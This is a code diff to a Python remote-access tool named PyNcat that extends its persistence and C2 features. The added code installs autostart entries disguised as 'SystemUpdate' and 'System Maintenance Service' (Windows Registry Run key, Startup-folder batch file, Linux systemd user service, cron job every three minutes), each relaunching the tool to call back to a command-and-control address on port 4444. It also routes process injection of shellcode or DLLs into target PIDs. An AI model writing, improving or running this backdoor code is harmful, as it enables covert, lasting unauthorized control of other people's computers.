@@ -46,82 +46,138 @@ class PyNcat:
         parser.add_argument('-v', '--verbose', action='store_true')
         return parser.parse_args()
 
-    # ====================== PERSISTENCE ======================
+         # ====================== PERSISTENCE ======================
     def install_persistence(self):
-        """Install persistence based on OS"""
+        """Install persistence with automatic C2 configuration"""
         if not self.args.persistent:
             return
 
+        c2_ip = self.args.connect
+        if not c2_ip:
+            c2_ip = self._get_public_ip() or "YOUR_C2_IP_HERE"
+
+        logger.info(f"[*] Installing persistence pointing to C2: {c2_ip}")
+
         system = platform.system().lower()
-        logger.info(f"[*] Installing persistence on {system}...")
-
+        
         if system == "windows":
-            self._windows_persistence()
+            self._windows_persistence(c2_ip)
         elif system == "linux":
-            self._linux_persistence()
+            self._linux_persistence(c2_ip)
         else:
-            logger.warning("[!] Persistence not supported on this OS yet.")
+            logger.warning(f"[!] Persistence not fully supported on {system}")
 
-    def _windows_persistence(self):
-        """Windows Registry Run Key"""
+    def _get_public_ip(self) -> Optional[str]:
+        """Try to get public IP automatically"""
         try:
+            import urllib.request
+            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
+                return response.read().decode('utf-8').strip()
+        except:
+            try:
+                import socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                return s.getsockname()[0]
+            except:
+                return None
+
+    def _windows_persistence(self, c2_ip: str):
+        """Windows - Multiple methods"""
+        methods = []
+        exe_path = os.path.abspath(sys.argv[0])
+        cmd = f'"{exe_path}" -c {c2_ip} -p 4444 --ssl --persistent'
+
+        try:
+            # Method 1: HKCU Run Key (most common)
             import winreg
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            exe_path = os.path.abspath(sys.argv[0])
-
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "PyNcat", 0, winreg.REG_SZ, f'"{exe_path}" -c YOUR_C2_IP -p 4444 --ssl --persistent')
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                               0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, cmd)
             winreg.CloseKey(key)
-            logger.info("[+] Windows Registry persistence installed (HKCU\\Run)")
-        except Exception as e:
-            logger.error(f"Windows persistence failed: {e}")
+            methods.append("Registry (HKCU\\Run)")
+        except:
+            pass
 
-    def _linux_persistence(self):
-        """Linux persistence (cron or systemd)"""
         try:
-            # Try systemd user service first
+            # Method 2: Startup Folder
+            startup = os.path.join(os.getenv('APPDATA'), 
+                                 r"Microsoft\Windows\Start Menu\Programs\Startup")
+            shortcut = os.path.join(startup, "SystemUpdate.lnk")
+            # Simple .bat fallback
+            bat_path = os.path.join(startup, "update.bat")
+            with open(bat_path, "w") as f:
+                f.write(f'@echo off\n{cmd}')
+            methods.append("Startup Folder")
+        except:
+            pass
+
+        if methods:
+            logger.info(f"[+] Windows persistence installed via: {', '.join(methods)}")
+        else:
+            logger.error("[!] All Windows persistence methods failed")
+
+    def _linux_persistence(self, c2_ip: str):
+        """Linux persistence methods"""
+        exe_path = os.path.abspath(sys.argv[0])
+        cmd = f"{exe_path} -c {c2_ip} -p 4444 --ssl --persistent"
+
+        methods = []
+
+        # Method 1: systemd user service
+        try:
             service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
             os.makedirs(os.path.dirname(service_path), exist_ok=True)
-
-            service_content = f"""[Unit]
-Description=PyNcat Persistent Service
+            
+            service = f"""[Unit]
+Description=System Maintenance Service
 
 [Service]
-ExecStart={os.path.abspath(sys.argv[0])} -c YOUR_C2_IP -p 4444 --ssl --persistent
+ExecStart={cmd}
 Restart=always
-RestartSec=10
+RestartSec=8
 
 [Install]
 WantedBy=default.target
 """
-
             with open(service_path, "w") as f:
-                f.write(service_content)
+                f.write(service)
 
-            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
-            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
-            logger.info("[+] Linux systemd user service persistence installed")
+            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, check=False)
+            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True, check=False)
+            methods.append("systemd user service")
         except:
-            # Fallback to cron
-            try:
-                cron_cmd = f"*/5 * * * * {os.path.abspath(sys.argv[0])} -c YOUR_C2_IP -p 4444 --ssl --persistent"
-                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
-                logger.info("[+] Linux cron persistence installed")
-            except Exception as e:
-                logger.error(f"Cron persistence failed: {e}")
+            pass
+
+        # Method 2: Cron
+        try:
+            cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
+            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
+            methods.append("cron job")
+        except:
+            pass
+
+        if methods:
+            logger.info(f"[+] Linux persistence installed: {', '.join(methods)}")
+        else:
+            logger.error("[!] Failed to install Linux persistence")
 
     # ====================== RUN ======================
     def run(self):
-        # Handle injection first
+        # Process Injection (highest priority)
         if self.args.inject_pid:
-            # ... (keep your injection code)
+            if self.args.inject_shellcode:
+                self.inject_shellcode(self.args.inject_pid, self.args.inject_shellcode)
+            elif self.args.inject_dll:
+                self.inject_dll(self.args.inject_pid, self.args.inject_dll)
             return
 
-        # Install persistence if requested
+        # Install persistence BEFORE connecting
         if self.args.persistent:
             self.install_persistence()
 
-        # Normal C2 operation
+        # Normal C2 Operation
         if self.args.listen:
             self.listen()
         else:
@@ -129,7 +185,6 @@ WantedBy=default.target
                 self.connect_persistent()
             else:
                 self.connect_once()
-
 
 if __name__ == "__main__":
     try:
